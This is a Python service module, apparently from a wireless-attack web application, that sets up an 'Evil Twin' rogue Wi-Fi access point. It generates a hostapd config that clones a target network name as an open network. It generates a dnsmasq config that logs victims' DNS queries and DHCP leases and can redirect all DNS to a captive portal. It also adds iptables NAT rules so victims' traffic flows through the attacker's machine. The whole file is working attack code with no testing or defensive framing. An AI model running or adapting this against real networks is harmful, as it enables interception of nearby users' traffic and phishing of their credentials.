"""Service for Evil Twin AP attack."""

import os
import uuid
import asyncio
import logging
from typing import Optional
from app.config import settings
from app.models.schemas import EvilTwinRequest
from app.utils.process_manager import process_manager

logger = logging.getLogger(__name__)


class EvilTwinService:
    def __init__(self):
        self._active_twin: Optional[dict] = None
        self._hostapd_proc_id: Optional[str] = None
        self._dnsmasq_proc_id: Optional[str] = None

    async def start(self, req: EvilTwinRequest) -> dict:
        """
        Create an Evil Twin AP:
        1. Configure hostapd (rogue AP)
        2. Configure dnsmasq (DHCP + DNS)
        3. Set up IP forwarding and iptables
        """
        twin_id = str(uuid.uuid4())[:8]

        # Generate hostapd config
        hostapd_conf = settings.DATA_DIR / f"hostapd_{twin_id}.conf"
        hostapd_content = f"""interface={req.interface}
driver=nl80211
ssid={req.target_essid}
hw_mode=g
channel={req.channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
"""
        with open(hostapd_conf, "w") as f:
            f.write(hostapd_content)

        # Configure interface IP
        await process_manager.run_sync(
            ["ip", "addr", "flush", "dev", req.interface], timeout=5
        )
        await process_manager.run_sync(
            ["ip", "addr", "add", "10.0.0.1/24", "dev", req.interface], timeout=5
        )
        await process_manager.run_sync(
            ["ip", "link", "set", req.interface, "up"], timeout=5
        )

        # Generate dnsmasq config
        dnsmasq_conf = settings.DATA_DIR / f"dnsmasq_{twin_id}.conf"
        dnsmasq_content = f"""interface={req.interface}
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
log-facility={settings.LOGS_DIR}/dnsmasq_{twin_id}.log
"""
        if req.captive_portal:
            dnsmasq_content += "address=/#/10.0.0.1\n"

        with open(dnsmasq_conf, "w") as f:
            f.write(dnsmasq_content)

        # Enable IP forwarding if internet sharing
        if req.internet_interface:
            await process_manager.run_sync(
                ["sysctl", "-w", "net.ipv4.ip_forward=1"], timeout=5
            )
            await process_manager.run_sync([
                "iptables", "-t", "nat", "-A", "POSTROUTING",
                "-o", req.internet_interface, "-j", "MASQUERADE",
            ], timeout=5)
            await process_manager.run_sync([
                "iptables", "-A", "FORWARD",
                "-i", req.interface, "-o", req.internet_interface,
                "-j", "ACCEPT",
            ], timeout=5)

        # Start dnsmasq
        dnsmasq_proc = await process_manager.run(
            ["dnsmasq", "-C", str(dnsmasq_conf), "-d"],
            timeout=None,  # Runs indefinitely
        )

        # Start hostapd
        hostapd_proc = await process_manager.run(
            ["hostapd", str(hostapd_conf)],
            timeout=None,
        )

        self._active_twin = {
            "id": twin_id,
            "essid": req.target_essid,
            "channel": req.channel,
            "interface": req.interface,
            "ip": "10.0.0.1",
            "dhcp_range": "10.0.0.10-100",
            "internet_forwarding": req.internet_interface is not None,
            "captive_portal": req.captive_portal,
        }

        return self._active_twin

    async def stop(self) -> dict:
        """Stop the Evil Twin and clean up."""
        results = []

        # Kill hostapd and dnsmasq
        for proc_name in ["hostapd", "dnsmasq"]:
            stdout, _, rc = await process_manager.run_sync(
                ["pkill", "-f", proc_name], timeout=5
            )
            results.append({"process": proc_name, "killed": rc == 0})

        # Flush iptables NAT rules
        await process_manager.run_sync(
            ["iptables", "-t", "nat", "-F"], timeout=5
        )
        await process_manager.run_sync(
            ["iptables", "-F", "FORWARD"], timeout=5
        )

        # Disable IP forwarding
        await process_manager.run_sync(
            ["sysctl", "-w", "net.ipv4.ip_forward=0"], timeout=5
        )

        twin = self._active_twin
        self._active_twin = None
        return {"stopped": True, "twin": twin, "cleanup": results}

    def status(self) -> dict:
        return {
            "active": self._active_twin is not None,
            "twin": self._active_twin,
        }


evil_twin_service = EvilTwinService()
